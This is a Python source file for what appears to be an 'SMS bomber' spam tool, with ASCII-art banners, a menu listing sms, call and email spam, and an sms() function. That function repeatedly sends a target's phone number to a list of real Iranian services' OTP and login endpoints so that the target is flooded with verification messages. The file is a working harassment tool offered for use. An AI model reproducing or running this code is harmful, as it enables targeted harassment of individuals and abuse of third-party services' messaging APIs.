import requests
import time
import json
import os

# text
class text:
    ## welcome
    def welcome():
        print(text.green+"""
──────────────────████
─────────────────█░░███
─────────────────█░░████
──────────────────███▒██─────████████
────────████████─────█▒█──████▒▒▒▒▒▒████
──────███▒▒▒▒▒▒████████████░░████▒▒▒▒▒███
────██▒▒▒▒░▒▒████░░██░░░░██░░░░░█▒▒▒▒▒▒▒███
───██▒▒░░░░▒██░░░░░█▒░░░░░██▒░░░░░░░▒▒▒▒▒▒█
──██▒░░░░░▒░░░░░░░░░▒░░░░░░░▒▒░░░░░░░▒▒▒▒▒██
──█░░░░░░▒░░░██░░░░░░░░░░░░░██░░░░░░░░▒▒▒▒▒█
──█░░░░░░░░█▒▒███░░░░░░░░░█▒▒███░░░░░░░▒▒▒▒█
──█░░░░░░░████████░░░░░░░████████░░░░░░▒▒▒▒█
──█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█
──██░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░▒▒▒▒█
───█░░░░██░█░░░░░░░░░░░░░░░░░░░░░░░███▒▒▒▒▒█
───█▒▒░░░░█████░░░█░░░░██░░░██░░████░▒▒▒▒▒▒█
───██▒▒░░░░░█████████████████████░░░▒▒▒▒▒▒██
────██▒▒▒▒░░░░░██░░░███░░░██░░░█░░░▒▒▒▒▒▒██
─────███▒▒▒░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█████
───────███▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▒▒▒████
──────────██████████████████████████

╻ ╻┏━╸╻  ┏━╸┏━┓┏┳┓┏━╸   ╺┳╸┏━┓   ┏━┓┏━┓┏━┓┏┳┓┏┳┓┏━╸┏━┓
┃╻┃┣╸ ┃  ┃  ┃ ┃┃┃┃┣╸     ┃ ┃ ┃   ┗━┓┣━┛┣━┫┃┃┃┃┃┃┣╸ ┣┳┛
┗┻┛┗━╸┗━╸┗━╸┗━┛╹ ╹┗━╸    ╹ ┗━┛   ┗━┛╹  ╹ ╹╹ ╹╹ ╹┗━╸╹┗╸""")

    ## love
    def love():
        print(text.header+"""
────────────────────▒
───────────────────░█
──────────────────███
─────────────────██ღ█
────────────────██ღ▒█──────▒█
───────────────██ღ░▒█───────██
───────────────█ღ░░ღ█──────█ღ▒█
──────────────█▒ღ░▒ღ░█───██░ღღ█
─────────────░█ღ▒░░▒ღ░████ღღღ█
─────░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
─────▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
─────██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
─────██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
────██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
────█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
───██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
───█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
──██ღღ▒████████████ღღ████████████░ღ█▒
──█░ღღ████████████████████████████ღღ█
──█▒ღ██████████████████████████████ღ█
──██ღღ████████████████████████████ღ██
───██ღღ██████████████████████████ღ██
────░██ღღ██████████████████████ღღ██
──────▓██ღ▒██████████████████▒ღ██
─────░──░███ღ▒████████████▒ღ███
──────░░───▒██ღღ████████▒ღ██
─────────────▒██ღ██████ღ██
───────────────██ღ████ღ█
─────────────────█ღ██ღ█
──────────────────█ღღ█
──────────────────█ღ█░
───────────────────██░
"""+text.endc)

    ## colors list
    header = '\033[95m'
    blue = '\033[94m'
    cyan = '\033[96m'
    green = '\033[92m'
    warning = '\033[93m'
    fail = '\033[91m'
    endc = '\033[0m'
    bold = '\033[1m'

    ## status 
    def status(path, message = ""):
        if (path == "+"): return "["+text.green+"*"+text.endc+"] "+text.green+ message +text.endc
        if (path == "*"): return "["+text.warning+"*"+text.endc+"] "+text.warning+ message +text.endc
        if (path == "-"): return "["+text.fail+"*"+text.endc+"] "+text.fail+ message +text.endc
        if (path == "@"): return "["+text.cyan+"*"+text.endc+"] "+text.cyan+ message +text.endc
        if (path == "#"): return "["+text.header+"*"+text.endc+"] "+text.header+ message +text.endc

# spam
class spam:
    ## menu
    def menu():
        print(text.endc+"""
+----------------------------+--------+
|        Reason              | Number |
+----------------------------+--------+
| sms                        |      1 |
+----------------------------+--------+
| call                       |      2 |
+----------------------------+--------+
| email                      |      3 |
+----------------------------+--------+
""")

    ## sms script
    def sms(number,repetition):
        print("\n"+text.status("#")+"Starting to send SMS bombs ...")
        repetition = int(20) if repetition == "" else int(repetition)
        number_of_messages_sent = 0  

        ### sms api
        sms_api = { "xxx1":{"name":"snapp","url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone":"+98"+number}},
                    "xxx2":{"name":"basalam","url": "https://auth.basalam.com/otp-request","data": {"mobile":"0"+number,"client_id":11}},
                    # "xxx3":{"name":"tap33","url": "https://zoloto585.ru/api/bcard/reg/","data": {"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..", "phone": formatted_phone, "email": "", "city": ""}},
                    # "xxx4":{"name":"alibaba","url": "https://ws.alibaba.ir/api/v3/account/mobile/otp","data": {"phoneNumber":"0"+number}},
                    # "xxx5":{"name":"filmnet","url": "https://api-v2.filmnet.ir/access-token/users/0"+number+"/otp","data": {}},
                    # "xxx6":{"name":"gapfilm","url": "https://core.gapfilm.ir/mobile/request.asmx/RequestOtpCode","data": {"request":{"Phone":"0"+number}}},
                    # "xxx7":{"name":"snapp","url": "https://web-api.snapp.ir/api/v1/auth/otp","data": {"cellphone":"0"+number,"g-recaptcha-response":""}},
                    "xxx8":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+number,"data": {"cellphone": "0"+number}},
                    # "xxx9":{"name":"divar","url": "   ","data": {"phone":"0"+number}},
                    # "xx10":{"name":"bama","url": "https://bama.ir/signin-checkforcellnumber","data": {"cellNumber":"0"+number}},
                    # "xx11":{"name":"torob","url": "https://api.torob.com/a/phone/send-pin/?phone_number=0"+number,"data": {}},
                    "xx12":{"name":"emtiyaz","url": "https://web.emtiyaz.app/json/login","data": {"send":1,"cellphone":"0"+number}},
                    "xx13":{"name":"tebinja","url": "https://www.tebinja.com/api/v1/users","data": {"username":"0"+number}},
                    "xx14":{"name":"nobat","url": "https://nobat.ir/nuser/inc/nUserSendCode","data": {"mobile":"0"+number}},
                    # "xx15":{"name":"sheypoor","url": "https://www.sheypoor.com/auth","data": {"username":"0"+number}},
                    # "xx16":{"name":"mihanpezeshk","url": "https://www.mihanpezeshk.com/verify_code_patient/0"+number,"data": {}},
                    # "xx17":{"name":"doctoreto","url": "https://doctoreto.com/web/api/v2/auth/code","data": {"mobile":"0"+number}},
                    # "xx18":{"name":"darmankade","url": "https://base.darmankade.com/v1/PatientLogin","data": {"Mobile":"0"+number}},
                    # "xx19":{"name":"drsaina","url": "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2F","data": {"noLayout":False,"action":"checkIfUserExistOrNot","lId":"","codeGuid":"00000000-0000-0000-0000-000000000000","PhoneNumber":"0"+number,"confirmCode":"","fullName":"","Password":"","Password2":""}},
                    # "xx20":{"name":"pezeshkekhoob","url": "https://pezeshkekhoob.com/api/register/fast","data": {"firstName":"","lastName":"","gender":1,"tel":"0"+number,"termsAndConditions":True}},
                    "xx21":{"name":"amootsoft","url": "https://account.amootsoft.com/Account/SignUp","data": {"AccountOAuthTempID":"12","Mobile":"0"+number,"Email":"","GenderType":"Male","FirstName":"12","LastName":"12"}},
                    # "xx22":{"name":"inoor","url": "https://accounts.inoor.ir/api/v1.0/register/chooseway","data": {"way":"mobile","identity":"+98-"+number}},
                    # "xx23":{"name":"tapdoo","url": "https://www.tapdoo.com/user/loginno","data": {"phone":"0"+number}},
                    # "xx24":{"name":"snapptrip","url": "https://www.snapptrip.com/register","data": {"lang":"fa","country_id":"1","password":"12","mobile_phone":"0"+number,"country_code":"+98","email":"12"}},
                    # "xx25":{"name":"sandbox","url": "https://sandbox.sbm24.net/api/v1/register/confirm","data": {"username":"0"+number}},
                    "xx26":{"name":"drdr","url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode","data": {"phoneNumber":number,"userType":"PATIENT"}},
                    # "xx27":{"name":"drdr","url": "https://drdr.ir/api/registerEnrollment/voip","data": {"phoneNumber":number,"userType":"PATIENT"}},
                    # "xx28":{"name":"wishato","url": "https://wishato.com/api/users/join/signup","data": {"cellphone":"+98-"+number}},
                    # "xx29":{"name":"bitooman","url": "https://www.bitooman.ir/Account/SendAgainCellPhoneVerificationKey","data": {"CellPhoneNumber":"0"+number}},
                    "xx30":{"name":"mopon","url": "http://www.mopon.ir/%D8%A7%D8%B1%D8%B3%D8%A7%D9%84-%DA%A9%D8%AF-%D9%81%D8%B9%D8%A7%D9%84-%D8%B3%D8%A7%D8%B2%DB%8C?phone=0"+number,"data": {}},
                    "xx31":{"name":"eavar","url": "https://www.eavar.com/fa/v2/signupbymobile/","data": {"mobile":"0"+number}},
                    "xx32":{"name":"eavar","url": "https://www.eavar.com/fa/v2/sendmobileverificationcode/","data": {"mobile":"0"+number}},
                    # "xx33":{"name":"kowsareshop","url": "https://kowsareshop.com/Customer/SendSmsActivationCode","data": {"MobileNumber":"0"+number}},
                    # "xx34":{"name":"bitel","url": "https://api.bitel.rest/api/v1/auth/register","data": {"phone":"0"+number,"company":"pass"}},
                    # "xx35":{"name":"bitel","url": "https://api.bitel.rest/api/v1/auth/otp","data": {"phone":"0"+number,"type":1}},
                    "xx36":{"name":"a4baz","url": "https://a4baz.com/api/web/login","data": {"cellphone":"0"+number}},
                    ## "xx37":{"name":"a4baz","url": "https://a4baz.com/api/web/forgot_pasword","data": {"cellphone":"0"+number}},
                    # "xx38":{"name":"hubcar","url": "https://hubcar.ir/user/register_action","data": {"type":"request","identity":"0"+number,"code":"","pass":"","invite_id":""}},
                    "xx39":{"name":"tagmond","url": "https://tagmond.com/phone_number","data": {"utf8":"%E2%9C%93","phone_number":"+98"+number}},
                    # "xx40":{"name":"shadmessenger50","url": "https://shadmessenger50.iranlms.ir/","data": {"api_version":"3","method":"sendCode","data":{"phone_number":"98"+number,"send_type":"SMS"}}},
                    # "xx41":{"name":"snapp doctor","url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0"+number+"/sms?cCode=+98","data": {}}
                }

        ### spam while
        while repetition > number_of_messages_sent:
            for sms_provider in sms_api:
                provider_name = sms_api[sms_provider]["name"]
                api_url = sms_api[sms_provider]["url"]
                submission_format = sms_api[sms_provider]["data"]
                send_message = requests.post(api_url,data=submission_format)
                print(text.status("#")+"Send SMS +1 ("+provider_name+") "+text.header+send_message.reason+text.endc)
                if (repetition < number_of_messages_sent): break 
                else : number_of_messages_sent+=1
            time.sleep(4)

        ### while else        
        else :
            text.love()
            print(text.status("#")+"Messages sent successfully (:")
            input(text.status("@","Press enter to refresh the page "))

# cmd
class cmd:
    ## clear screen
    def clear():
        os.system('clear' if os.name == 'posix' else 'cls')

    ## run command
    def run(path):
        os.system(path)
        